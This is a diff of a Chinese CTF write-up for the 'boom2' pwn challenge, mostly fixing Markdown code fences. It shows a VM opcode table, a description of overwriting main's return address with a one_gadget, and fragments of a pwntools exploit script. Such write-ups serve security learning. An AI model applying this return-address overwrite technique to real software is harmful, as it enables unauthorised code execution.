@@ -131,11 +131,11 @@ if __name__ == "__main__":
 
 # boom2
 
-```c
 一个去掉了库函数的boom1，读的是int64的token，[对应源码](https://github.com/cng3s/tiny-c-vm-demo/blob/master/vm.c)
 
 支持的命令如下
-​```
+
+```
 0 : LEA
 6 : ENT
 8 : LEV
@@ -161,11 +161,11 @@ if __name__ == "__main__":
 28 : DIV
 29 : MOD
 30 : EXIT
-​```
+```
 
 程序一开始把argv的地址写入到虚拟机的栈里，我们可以利用这个，在配合指令，加加减减把`main`函数的返回地址改成`one_gadget`
 
-​```python=
+```python
 from pwn import *
 
 context.arch = 'amd64'
@@ -215,13 +215,13 @@ def main(host,port=36642):
 	op += p64(30)	# exit
 	p.send(op)
 	p.interactive()
-	
+
 if __name__ == "__main__":
 	# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
 	# elf = ELF("./pwn",checksec=False)
 	main(args['REMOTE'])
-​```
 ```
+
 
 这题明显比boom1简单，但是解出来的人却少了100多，就离谱
 
